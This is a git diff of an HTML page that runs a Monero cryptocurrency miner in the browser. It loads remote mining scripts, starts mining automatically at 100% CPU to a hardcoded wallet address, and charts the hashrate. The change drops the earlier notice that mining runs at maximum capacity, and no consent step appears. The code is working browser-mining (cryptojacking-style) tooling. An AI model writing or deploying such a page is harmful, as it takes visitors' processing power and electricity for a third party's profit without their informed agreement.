@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Extreme Monero WebMiner</title>
+  <meta charset="UTF-8">
+  <title>🔥 Monero WebMiner</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     body {
       background: black;
@@ -11,94 +11,68 @@
       font-family: monospace;
       text-align: center;
     }
-    #hashrate, #total {
-      font-size: 1.5em;
-      margin-top: 20px;
-    }
     canvas {
-      margin-top: 30px;
       background: #111;
       border: 1px solid lime;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <h1>🔥 Monero Miner Active</h1>
-  <p>CPU mining has started at maximum capacity.</p>
-  <p>Do not close this tab for maximum efficiency.</p>
-  <div id="hashrate">Hashrate: calculating...</div>
-  <div id="total">Total Hashes: 0</div>
+  <p id="hashrate">Hashrate: loading...</p>
+  <p id="total">Total hashes: 0</p>
   <canvas id="chart" width="400" height="200"></canvas>
 
-  <!-- EXTREME MINER SCRIPT -->
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+  <script src="https://webminerpool.com/lib/simple-ui.js"></script>
   <script>
-    server = "wss://ny1.xmrminingproxy.com";
-    var pool = "gulf.moneroocean.stream:10004";
-    var walletAddress = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
-    var workerId = "ExtremeWebMiner";
-    var threads = navigator.hardwareConcurrency || -1;
-    var throttleMiner = 0;
+    const miner = new Client.Anonymous("83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr", {
+      throttle: 0, // 100% CPU
+      c: "wmp",    // Custom label
+      ads: 0
+    });
 
-    startMining(pool, walletAddress, workerId, threads, "");
-    throttleMiner = 0;
-    stopOnError = false;
-    debug = true;
+    miner.start();
 
-    // Chart.js setup
-    const ctx = document.getElementById('chart').getContext('2d');
+    // Chart setup
+    const ctx = document.getElementById("chart").getContext("2d");
     const data = {
       labels: [],
       datasets: [{
-        label: 'Hashrate (H/s)',
+        label: "Hashrate (H/s)",
         data: [],
-        borderColor: 'lime',
-        borderWidth: 1,
-        pointRadius: 0,
+        borderColor: "lime",
         fill: false,
-        tension: 0.1
+        tension: 0.2
       }]
     };
-    const config = {
-      type: 'line',
+    const chart = new Chart(ctx, {
+      type: "line",
       data: data,
       options: {
         animation: false,
         scales: {
           x: { display: false },
-          y: {
-            beginAtZero: true,
-            ticks: { color: 'lime' },
-            grid: { color: '#333' }
-          }
-        },
-        plugins: {
-          legend: { labels: { color: 'lime' } }
+          y: { beginAtZero: true }
         }
       }
-    };
-    const chart = new Chart(ctx, config);
+    });
 
-    // Update stats and chart
-    setInterval(function () {
-      if (typeof getHashRate === 'function') {
-        var hashrate = getHashRate().toFixed(2);
-        document.getElementById("hashrate").textContent = "Hashrate: " + hashrate + " H/s";
+    setInterval(() => {
+      const hps = miner.getHashesPerSecond().toFixed(2);
+      const total = miner.getTotalHashes();
 
-        // Add to chart
-        const now = new Date().toLocaleTimeString();
-        if (data.labels.length > 30) {
-          data.labels.shift();
-          data.datasets[0].data.shift();
-        }
-        data.labels.push(now);
-        data.datasets[0].data.push(hashrate);
-        chart.update();
+      document.getElementById("hashrate").textContent = `Hashrate: ${hps} H/s`;
+      document.getElementById("total").textContent = `Total hashes: ${total}`;
+
+      // Update chart
+      if (data.labels.length > 30) {
+        data.labels.shift();
+        data.datasets[0].data.shift();
       }
-      if (typeof getTotalHashes === 'function') {
-        document.getElementById("total").textContent = "Total Hashes: " + getTotalHashes();
-      }
+      data.labels.push(""); // skip label
+      data.datasets[0].data.push(hps);
+      chart.update();
     }, 1000);
   </script>
 </body>
